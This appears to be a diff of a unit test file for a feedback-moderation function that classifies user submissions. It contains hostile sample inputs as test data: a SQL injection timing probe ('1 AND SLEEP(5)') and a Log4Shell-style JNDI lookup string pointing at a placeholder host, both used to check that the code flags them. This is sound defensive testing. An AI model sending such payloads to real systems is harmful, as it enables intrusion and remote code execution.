@@ -21,6 +21,7 @@ const base = {
 describe('feedback workflow', () => {
   it('classifies public, stale, low-information and suspicious feedback', () => {
     expect(feedbackDisposition({ ...base, id: 'safe', content: '比赛日期应为八月二日' }, now)).toEqual({
+      invalidType: false,
       riskReason: null,
       lowInformation: false,
       eventScope: 'public',
@@ -37,6 +38,17 @@ describe('feedback workflow', () => {
     expect(
       feedbackDisposition({ ...base, id: 'probe', content: '1 AND SLEEP(5)' }, now).riskReason,
     ).toBe('sql_probe');
+    expect(
+      feedbackDisposition(
+        {
+          ...base,
+          id: 'invalid',
+          feedbackType: '${jndi:ldap://example.test/a}',
+          content: '日期需要核对',
+        },
+        now,
+      ).invalidType,
+    ).toBe(true);
   });
 
   it('builds mutually exclusive queue counts and exact duplicate counts', () => {
